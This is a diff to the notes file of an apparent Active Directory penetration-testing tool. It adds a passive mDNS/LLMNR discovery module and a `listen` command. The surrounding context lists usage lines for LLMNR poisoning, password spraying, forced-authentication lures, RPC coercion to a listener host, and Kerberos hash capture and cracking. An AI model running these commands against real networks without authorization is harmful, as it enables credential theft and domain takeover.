@@ -15,7 +15,7 @@ consumes them. Change it only deliberately, bump `SCHEMA_VERSION`, and log it in
 `docs/DECISIONS.md`.
 
 ## Current status (2026-08-11)
-PRs #1–#4 all merged to `main`. Working, tested (255 tests), builds to a single offline
+PRs #1–#4 all merged to `main`. Working, tested (265 tests), builds to a single offline
 `.exe` with `demo / report / live / scan / poison / spray / trigger / coerce`. Real findings need `nxc` +
 `certipy` on PATH; `poison` needs `responder` (Linux/Kali).
 
@@ -31,6 +31,7 @@ redness/
   scope.py        # parse --targets scope file (IP/host/CIDR per line, # comments)
   paths.py        # derive attack-path edges from findings (owned/roastable/ADCS -> Domain Admin)
   relay.py        # derive NTLM relay chains (coerce + no-signing + ESC8) -> "NTLM Relay" node
+  mcast.py        # passive link-local discovery (mDNS/LLMNR/NBT-NS/SSDP); `listen` command
   crack.py        # capture AS-REP/Kerberoast hashes -> loot files -> crack (hashcat/john)
   cli.py          # entrypoint: demo / report / live / scan / poison / spray / trigger / coerce
   spray.py        # gated `spray` command: lockout-aware nxc password spray (intrusive)
@@ -98,6 +99,7 @@ python -m redness.cli poison --iface eth0 --duration 600   # NetNTLMv2 capture (
 python -m redness.cli spray --target dc -p 'Spring2024!' --auth-user U --auth-pass P  # lockout-aware spray (intrusive; gated)
 python -m redness.cli trigger --host 10.10.0.5 --format html --out lure.html  # forced-auth lure
 python -m redness.cli coerce --target dc -u U -p P --listener 10.10.0.240  # RPC forced-auth coercion (run `poison` on the listener first; intrusive; gated)
+python -m redness.cli listen --duration 60 --live      # passive mDNS/LLMNR/NBT-NS/SSDP discovery on the segment
 ```
 Hash capture is automatic (AS-REP/Kerberoast via LdapEngine) → written to `loot/`.
 GPP cpasswords are recovered automatically on a credentialed scan (GppEngine → `nxc -M gpp_password`).
